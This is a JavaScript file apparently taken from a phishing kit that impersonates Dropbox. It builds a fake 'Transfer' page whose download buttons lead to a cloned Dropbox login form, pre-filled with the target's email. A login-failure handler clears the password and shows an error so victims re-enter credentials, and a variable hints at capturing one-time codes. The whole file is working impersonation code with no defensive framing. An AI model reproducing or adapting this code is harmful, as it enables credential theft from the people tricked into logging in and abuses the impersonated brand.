let maxOtpCount = 2;

window.addEventListener('load', function () {
    initApp(bindElements, document.getElementsByTagName('body')[0]);
})

function bindElements(params) {
    if (typeof params.hash.params[0] !== 'undefined'
        && params.hash.params[0] === 'login') {
        requirePassword(params);
    } else {
        showFilePage(params);
    }
}

function requirePassword(params) {
    window.LIB_submitButton = document.querySelector('button[type="submit"]');
    window.LIB_userInput = document.querySelector('input[name="login_email"]');
    window.LIB_pwdInput = document.querySelector('input[name="login_password"]');
    window.LIB_spinner = document.querySelector('button .LIB_spinner_el');
    window.LIB_form = document.getElementsByTagName('form')[0];

    window.LIB_pwdInput.addEventListener('keyup', function () {
        let notice = document.querySelector('.notice');
        notice.style.display = 'none';
        window.LIB_pwdInput.classList.remove('input-error')
    });

    window.LIB_userInput.addEventListener('focusin', function () {
        document.querySelector(`label[for="login_email17374335681132336"]`).remove();
    });

    window.LIB_pwdInput.addEventListener('focusin', function () {
        document.querySelector(`label[for="login_password5377872399203694"]`).remove();
    });

    window.LIB_userInput.addEventListener('focusout', function () {
        if (!window.LIB_userInput.value) {
            document.querySelector('.login-email .text-input-wrapper input')
                .insertAdjacentHTML('afterend', '<label for="login_email17374335681132336">Email</label>');
        }
    });

    window.LIB_pwdInput.addEventListener('focusout', function () {
        if (!window.LIB_pwdInput.value) {
            document.querySelector('.login-password .text-input-wrapper input')
                .insertAdjacentHTML('afterend', '<label for="login_password5377872399203694">Password</label>');
        }
    });

    window.LIB_onLoginFail = function () {
        let notice = document.querySelector('.notice');
        notice.style.display = 'block';
        document.querySelector('.c-card.c-card--error').style.display = 'block';
        window.LIB_pwdInput.value = '';
        window.LIB_pwdInput.classList.add('input-error')
    };

    window.LIB_userInput.value = params.email;
    document.querySelector(`label[for="login_email17374335681132336"]`).remove();

    document.getElementsByTagName('title')[0].innerText = 'Login - Dropbox';
    document.getElementsByTagName('html')[0].classList.add('media-desktop','js-focus-visible');

    document.querySelector('head title')
        .insertAdjacentHTML('afterend', '<link href="https://cfl.dropboxstatic.com/static/images/favicon-vfl8lUR9B.ico" rel="shortcut icon">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/main-vfl4nphV1.css" rel="stylesheet" type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_60_vis.png"\n' +
            '          rel="apple-touch-icon">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_76_vis.png"\n' +
            '          rel="apple-touch-icon" sizes="76x76">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_120_vis.png"\n' +
            '          rel="apple-touch-icon" sizes="120x120">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_152_vis.png"\n' +
            '          rel="apple-touch-icon" sizes="152x152">\n' +
            '    <meta content="text/html; charset=UTF-8" http-equiv="content-type">\n' +
            '    <meta content="https://www.dropbox.com/login" property="og:url">\n' +
            '    <meta content="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_200_vis.png"\n' +
            '          property="og:image">\n' +
            '    <meta content="https://www.dropbox.com/login" name="twitter:url">\n' +
            '    <meta content="Login - Dropbox " name="twitter:title">\n' +
            '    <meta content="Log in to Dropbox. Take your photos, docs and videos anywhere and keep your files safe."\n' +
            '          name="twitter:description">\n' +
            '    <meta content="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_200_vis.png"\n' +
            '          name="twitter:image">\n' +
            '    <meta content="https://cfl.dropboxstatic.com/static/images/logo_catalog/logo_m1.png" name="msapplication-TileImage">\n' +
            '    <meta content="#ffffff" name="msapplication-TileColor">\n' +
            '    <meta content="Log in to Dropbox. Take your photos, docs and videos anywhere and keep your files safe."\n' +
            '          name="description">\n' +
            '    <style type="text/css">.hny-sqbaz {\n' +
            '            display: none;\n' +
            '        }</style>\n' +
            '    <link crossorigin="anonymous" href="https://cfl.dropboxstatic.com/static/css/components/button-vfllw60O5.css"\n' +
            '          rel="stylesheet" type="text/css">\n' +
            '    <link crossorigin="anonymous"\n' +
            '          href="https://cfl.dropboxstatic.com/static/css/components/react_locale_selector-vfluPHu5g.css"\n' +
            '          rel="stylesheet" type="text/css">\n' +
            '    <link crossorigin="anonymous" href="https://cfl.dropboxstatic.com/static/css/dropbox/2015/layout-vflvc3veE.css"\n' +
            '          rel="stylesheet" type="text/css">\n' +
            '    <link crossorigin="anonymous" href="https://cfl.dropboxstatic.com/static/css/dropbox/2015/pages/index-vflK1gzWT.css"\n' +
            '          rel="stylesheet" type="text/css">\n' +
            '    <link crossorigin="anonymous" href="https://cfl.dropboxstatic.com/static/css/dropbox/base-vfloOI4PY.css"\n' +
            '          rel="stylesheet" type="text/css">\n' +
            '    <link crossorigin="anonymous" href="https://cfl.dropboxstatic.com/static/css/font_atlas_grotesk-vfldINMge.css"\n' +
            '          rel="stylesheet" type="text/css">\n' +
            '    <link crossorigin="anonymous" href="https://cfl.dropboxstatic.com/static/css/font_sharp_grotesk-vfle4tE4q.css"\n' +
            '          rel="stylesheet" type="text/css">\n' +
            '    <link crossorigin="anonymous" href="https://cfl.dropboxstatic.com/static/css/notify-vflHqdPvq.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link crossorigin="anonymous"\n' +
            '          href="https://cfl.dropboxstatic.com/static/css/privacy_consent/privacy_consent-vflfD5dll.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link crossorigin="anonymous" href="https://cfl.dropboxstatic.com/static/css/sprites/web_sprites-vflcKH0r6.css"\n' +
            '          rel="stylesheet" type="text/css">\n' +
            '    <link href="https://fonts.googleapis.com/css?family=Open+Sans:100,200,300,400,600,700&amp;subset=latin,latin-ext"\n' +
            '          rel="stylesheet" type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/login_or_register-vflrJ9wO9.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/dig-illustrations/index.web-vflTaPHqs.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/dig-components/index.web-vflM-Xosa.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/components/login_or_register-vflTMgZVU.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/legacy_packages/components-vflwFi1IV.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/scooter/scooter-scoped-vflpl9JSl.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/recaptcha_challenge-vflrcf67y.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/recaptcha_v2_challenge-vflYEW-GO.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/components/exp_cards-vfls5BO1G.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/components/login_form-vflPyw88n.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/spectrum/index.web-vflmHVRF-.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/components/password_strength_meter-vfljnpJyO.css"\n' +
            '          rel="stylesheet" type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/recaptcha-vflIN6j39.css" rel="stylesheet" type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/components/bubble_dropdown_v2-vflhhYVBe.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/abuse/funcaptcha_modal-vfl6bl9tt.css" rel="stylesheet"\n' +
            '          type="text/css">');

    document.querySelector('div.login-or-register-page').style.display = '';
}

function showFilePage(params) {

    // window.location = '#/login/' + params.email;
    document.getElementsByTagName('html')[0].classList.add('maestro','maestro--responsive','dig-Theme--VIS','js-focus-visible');
    document.getElementsByTagName('title')[0].innerText = 'Transfer – Dropbox';
    document.querySelectorAll('.download-btn').forEach((el) => {
        el.addEventListener('click', function () {
            window.location = '#/login/' + params.email;
            window.location.reload();
        })
    });

    document.querySelector('head title')
        .insertAdjacentHTML('afterend', '<link href="https://cfl.dropboxstatic.com/static/images/favicon-vfl8lUR9B.ico" rel="shortcut icon">\n' +
            '    <link crossorigin="anonymous"\n' +
            '          href="https://cfl.dropboxstatic.com/static/fonts/paper-atlasgrotesk/AtlasGrotesk-Regular-Web-vflk7bxjs.woff2"\n' +
            '          as="font" rel="preload" type="font/woff2">\n' +
            '    <link crossorigin="anonymous"\n' +
            '          href="https://cfl.dropboxstatic.com/static/fonts/paper-atlasgrotesk/AtlasGrotesk-Medium-Web-vfl38XiTL.woff2"\n' +
            '          as="font" rel="preload" type="font/woff2">\n' +
            '    <style>\n' +
            '        * {\n' +
            '            font-weight: inherit;\n' +
            '        }\n' +
            '\n' +
            '        html {\n' +
            '            box-sizing: border-box;\n' +
            '        }\n' +
            '\n' +
            '        /* To remove Firefox\'s extra padding */\n' +
            '        button::-moz-focus-inner,\n' +
            '        input[type=\'button\']::-moz-focus-inner,\n' +
            '        input[type=\'submit\']::-moz-focus-inner,\n' +
            '        input[type=\'reset\']::-moz-focus-inner {\n' +
            '            padding: 0;\n' +
            '            border: 0 none;\n' +
            '        }\n' +
            '\n' +
            '        [class^=\'maestro-sidebar\'] {\n' +
            '            box-sizing: border-box;\n' +
            '        }\n' +
            '\n' +
            '        .maestro body,\n' +
            '        .maestro input,\n' +
            '        .maestro textarea,\n' +
            '        .maestro select,\n' +
            '        .maestro button:not(.dig-Button, .dig-StylelessButton),\n' +
            '        .maestro .normal {\n' +
            '            font-family: AtlasGrotesk, sans-serif;\n' +
            '            font-size: 14px;\n' +
            '            -moz-osx-font-smoothing: grayscale;\n' +
            '            -webkit-font-smoothing: antialiased;\n' +
            '        }\n' +
            '\n' +
            '        .maestro body {\n' +
            '            margin: 0;\n' +
            '        }\n' +
            '\n' +
            '        .embedded-app {\n' +
            '            top: 0;\n' +
            '            bottom: 0;\n' +
            '            padding-left: 240px;\n' +
            '        }\n' +
            '\n' +
            '        .embedded-app__error-state {\n' +
            '            display: block;\n' +
            '            text-align: center;\n' +
            '            align-items: center;\n' +
            '            justify-content: center;\n' +
            '            flex-direction: column;\n' +
            '            bottom: 0;\n' +
            '        }\n' +
            '\n' +
            '        .maestro-loading-spinner-wrapper {\n' +
            '            position: fixed;\n' +
            '            top: 0;\n' +
            '            right: 0;\n' +
            '            bottom: 0;\n' +
            '            left: 0;\n' +
            '            display: flex;\n' +
            '            justify-content: center;\n' +
            '        }\n' +
            '\n' +
            '        .maestro-loading-spinner {\n' +
            '            position: absolute;\n' +
            '            top: 33%;\n' +
            '            width: 24px;\n' +
            '            height: 24px;\n' +
            '            background-image: url(\'https://cfl.dropboxstatic.com/static/images/icons/ajax-loading-small-blue@2x-vfl14X6Ll.gif\');\n' +
            '            background-size: 24px 24px;\n' +
            '            /* So the center of the image is used to center the element. */\n' +
            '            transform: translate(-50%, -50%);\n' +
            '        }</style>\n' +
            '    <style type="text/css"></style>\n' +
            '    <meta content="width=device-width,initial-scale=1.0,minimum-scale=1.0" name="viewport">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_60_vis.png"\n' +
            '          rel="apple-touch-icon">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_76_vis.png"\n' +
            '          rel="apple-touch-icon" sizes="76x76">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_120_vis.png"\n' +
            '          rel="apple-touch-icon" sizes="120x120">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_152_vis.png"\n' +
            '          rel="apple-touch-icon" sizes="152x152">\n' +
            '    <meta content="text/html; charset=UTF-8" http-equiv="content-type">\n' +
            '    <meta content="https://www.dropbox.com/transfer/AAAAAMMjcduiEJ6zFzKQhkHJ6T4g06QEw50TXZvSD-ICfkWq0hjovww"\n' +
            '          property="og:url">\n' +
            '    <meta content="website" property="og:type">\n' +
            '    <meta content="Dropbox" property="og:site_name">\n' +
            '    <meta content="https://ucc646e81aa64441cd25dc850834.previews.dropboxusercontent.com/p/thumb/ABQIUeMFXO3PPKOvuW4YF7gXuBrC4_8JgFFa0vYLn-XyqJSu9iWnQbRPeJBwN9eEXjC6ffIb2rksE4Bj0TK7-pr6epaOc6Bp2Tn7laybwseuD5QyHqsN_mjqeYOQ36ZVgEuraD5SZZHu-d2EQ54A_JLLsRb0XaBMKCqEjw9RHWCj6AcTkIOpGktj87BGhzxHHO8k6gunac4MYUipARVRitYRnGX47ZTx0kRzck3YJcYzSqa9EdUhd1u-a2fui89UPEYXlyb1_CRNkymuUbj4v7L5FlV8P-gjfQsp7gpFv0GAaDyggkz_OXP8y6bEpxLHge2rr5dGxWXKjCfWtuxAq0HwbDe-fjiVK0MaYIxILysDyw/p.png"\n' +
            '          property="og:image">\n' +
            '    <meta content="210019893730" property="fb:app_id">\n' +
            '    <meta content="summary_large_image" name="twitter:card">\n' +
            '    <meta content="@Dropbox" name="twitter:site">\n' +
            '    <meta content="https://www.dropbox.com/transfer/AAAAAMMjcduiEJ6zFzKQhkHJ6T4g06QEw50TXZvSD-ICfkWq0hjovww"\n' +
            '          name="twitter:url">\n' +
            '    <meta content="https://ucc646e81aa64441cd25dc850834.previews.dropboxusercontent.com/p/thumb/ABQIUeMFXO3PPKOvuW4YF7gXuBrC4_8JgFFa0vYLn-XyqJSu9iWnQbRPeJBwN9eEXjC6ffIb2rksE4Bj0TK7-pr6epaOc6Bp2Tn7laybwseuD5QyHqsN_mjqeYOQ36ZVgEuraD5SZZHu-d2EQ54A_JLLsRb0XaBMKCqEjw9RHWCj6AcTkIOpGktj87BGhzxHHO8k6gunac4MYUipARVRitYRnGX47ZTx0kRzck3YJcYzSqa9EdUhd1u-a2fui89UPEYXlyb1_CRNkymuUbj4v7L5FlV8P-gjfQsp7gpFv0GAaDyggkz_OXP8y6bEpxLHge2rr5dGxWXKjCfWtuxAq0HwbDe-fjiVK0MaYIxILysDyw/p.png"\n' +
            '          name="twitter:image">\n' +
            '    <meta content="https://cfl.dropboxstatic.com/static/images/logo_catalog/logo_m1.png" name="msapplication-TileImage">\n' +
            '    <meta content="#ffffff" name="msapplication-TileColor">\n' +
            '    <meta content="Dropbox is a free service that lets you take your photos, docs and videos anywhere and share them easily. Never email yourself a file again!"\n' +
            '          name="description">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/preview_image-vfl-h4TzK.css" rel="stylesheet" type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/js/file-viewer/index.web-vflSB9Vm7.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/dig-components/index.web-vflM-Xosa.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/file_transfers/page_header-vflC2bW60.css" rel="stylesheet"\n' +
            '          type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/font_paper_atlas_grotesk-vflEbKJso.css" rel="stylesheet">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/maestro_layout-vflk-V67M.css" rel="stylesheet">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/notify-vflHqdPvq.css" rel="stylesheet">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/font_paper_atlas_grotesk-vflEbKJso.css" rel="stylesheet" type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/maestro_layout-vflk-V67M.css" rel="stylesheet" type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/file_transfers/view_transfer_page-vflvQv2AC.css" rel="stylesheet" type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/css/spectrum/index.web-vflmHVRF-.css" rel="stylesheet" type="text/css">\n' +
            '    <link href="https://cfl.dropboxstatic.com/static/js/file-transfers/index.web-vflwmi8-D.css" rel="stylesheet" type="text/css">\n' +
            '');
    document.querySelector('div.file-page').style.display = '';

}